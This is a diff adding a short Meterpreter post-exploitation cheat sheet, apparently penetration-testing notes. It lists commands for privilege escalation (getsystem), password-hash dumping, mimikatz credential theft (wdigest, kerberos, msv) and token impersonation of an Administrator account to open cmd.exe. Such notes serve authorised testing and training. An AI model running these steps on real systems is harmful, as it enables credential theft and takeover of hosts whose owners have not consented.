@@ -1,0 +1,26 @@
+[+] Meterpreter Shell
+
+meterpreter > sysinfo
+
+meterpreter > getuid
+
+meterpreter > getsystem
+
+meterpreter > hashdump
+
+meterpreter > load/use mimikatz
+
+kerberos          Attempt to retrieve kerberos creds
+livessp           Attempt to retrieve livessp creds
+mimikatz_command  Run a custom commannd
+msv               Attempt to retrieve msv creds (hashes)
+ssp               Attempt to retrieve ssp creds
+tspkg             Attempt to retrieve tspkg creds
+wdigest           Attempt to retrieve wdigest creds
+
+meterpreter > wdigest
+
+meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token SERV-2K3\\Administrator
+execute -f cmd.exe -i -t
